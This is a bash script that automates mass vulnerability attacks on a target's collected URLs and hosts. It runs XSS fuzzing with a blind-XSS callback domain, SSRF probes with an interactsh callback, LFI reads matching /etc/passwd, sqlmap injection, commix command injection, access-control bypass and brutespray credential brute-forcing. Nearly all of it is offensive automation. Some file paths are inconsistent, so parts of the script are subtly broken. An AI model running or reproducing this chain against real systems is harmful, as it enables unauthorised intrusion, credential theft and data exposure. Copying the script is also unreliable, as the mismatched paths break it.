start=$SECONDS
mkdir $1
mkdir $1/kawin

# XSS
cat $1/nembak/gf/xss.txt | qsreplace FUZZ | Gxss -c 100 -p Xss | anew -q $1/kawwin/xss_reflected_tmp.txt
mkdir $1/kawin/vulns
cat $1/kawin/xss_reflected_tmp.txt | dalfox pipe --silence --no-color --no-spinner --mass --mass-worker 100 --multicast --skip-bav --skip-grepping --skip-mining-all --skip-mining-dict -b bbgod.xss.ht -w 500 | anew -q $1/kawin/vulns/xss.txt

# Open Redirect
cat $1/nembak/gf/redirect.txt | qsreplace FUZZ | anew -q $1/kawin/redirect_tmp.txt
python3 ~/Tools/OpenRedireX/openredirex.py -l $1/kawin/redirect_tmp.txt --keyword FUZZ -p ~/Tools/OpenRedireX/payloads.txt | grep "^http" > $1/kawin/vulns/redirect.txt
sed -r -i "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" $1/kawin/vulns/redirect.txt

# SSRF
interactsh-client &>$1/kawin/ssrf_callback.txt &
sleep 2
COLLAB_SERVER_FIX=$(cat $1/kawin/ssrf_callback.txt | tail -n1 | cut -c 16-)
COLLAB_SERVER_URL="http://$COLLAB_SERVER_FIX"
INTERACT=true

cat $1/nembak/gf/ssrf.txt | qsreplace ${COLLAB_SERVER_FIX} | anew -q $1/kawin/ssrf_tmp.txt
cat $1/nembak/gf/ssrf.txt | qsreplace ${COLLAB_SERVER_URL} | anew -q $1/kawin/ssrf_tmp.txt
HEADER="User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
ffuf -v -H "${HEADER}" -t 100 -w $1/kawin/ssrf_tmp.txt -u FUZZ | grep "URL" | sed 's/| URL | //' | anew -q $1/kawin/vulns/ssrf_requests_url.txt
ffuf -v -w $1/kawin/ssrf_tmp.txt:W1,~/Tools/headers_inject.txt:W2 -H "${HEADER}" -H "W2: ${COLLAB_SERVER_FIX}" -t 100 -u W1 | anew -q $1/kawin/vulns/ssrf_requests_headers.txt
ffuf -v -w $1/kawin/ssrf_tmp.txt:W1,~/Tools/headers_inject.txt:W2 -H "${HEADER}" -H "W2: ${COLLAB_SERVER_URL}" -t 100 -u W1 | anew -q $1/kawin/vulns/ssrf_requests_headers.txt
sleep 5
cat $1/kawin/ssrf_callback.txt | tail -n+11 | anew -q $1/kawin/vulns/ssrf_callback.txt && NUMOFLINES=$(cat $1/kawin/ssrf_callback.txt | tail -n+12 | wc -l)
echo "SSRF: ${NUMOFLINES} callbacks received" 

# CRLF Injection
crlfuzz -l $1/nembak/allwebs.txt -o $1/kawin/vulns/crlf.txt

# LFI
cat $1/nembak/gf/lfi.txt | qsreplace FUZZ | anew -q $1/kawin/lfi_tmp.txt
for url in $(cat $1/kawin/lfi_tmp.txt); do
	ffuf -v -t 100 -H "${HEADER}" -w ~/Tools/lfi_wordlist.txt -u $url -mr "root:" 2>/dev/null | grep "URL" | sed 's/| URL | //' | anew -q $1/kawin/vulns/lfi.txt
done

# SSTI
cat $1/nembak/gf/ssti.txt | qsreplace FUZZ | anew -q $1/kawin/ssti_tmp.txt
for url in $(cat .tmp/tmp_ssti.txt); do
	ffuf -v -t 100 -H "${HEADER}" -w ~/Tools/ssti_wordlist -u $url -mr "ssti49" | grep "URL" | sed 's/| URL | //' | anew -q $1/kawin/vulns/ssti.txt
done

# SQL Injection
cat $1/nembak/gf/sqli.txt | qsreplace FUZZ | anew -q $1/kawin/sqli_tmp.txt
interlace -tL $1/kawin/sqli_tmp.txt -threads 10 -c "python3 ~/Tools/sqlmap/sqlmap.py -u _target_ -b --batch --disable-coloring --random-agent --output-dir=_output_" -o $1/kawin/vulns/sqlmap

# SSL Exploitation
~/Tools/testssl.sh/testssl.sh --quiet --color 0 -U -iL $1/nembak/ip.txt > $1/kawin/testssl.txt

# spraying
python3 ~/Tools/x90skysn3k/brutespray.py --file $1/nembak/portscan_active.gnmap --threads 20 --hosts 10 -o $1/kawin/brutespray

# 4xx Bypass
cat $1/nembak/fuzzing/*.txt | grep -E '^4' | grep -Ev '^404' | cut -d ' ' -f3 | dirdar -threads $DIRDAR_THREADS -only-ok > $1/kawin/dirdar.txt
cat $1/kawin/dirdar.txt | sed -e '1,12d' | sed '/^$/d' | anew -q $1/kawin/vulns/4xxbypass.txt

# Command Injection & RCE
cat $1/nembak/gf/rce.txt | qsreplace FUZZ | anew -q $1/kawin/rce_tmp.txt
python3 ~/Tools/commix/commix.py --batch -m $1/kawin/rce_tmp.txt --output-dir $1/kawin/vulns/command_injection txt

end=$SECONDS
echo ">>> script duration: $((end-start)) seconds."
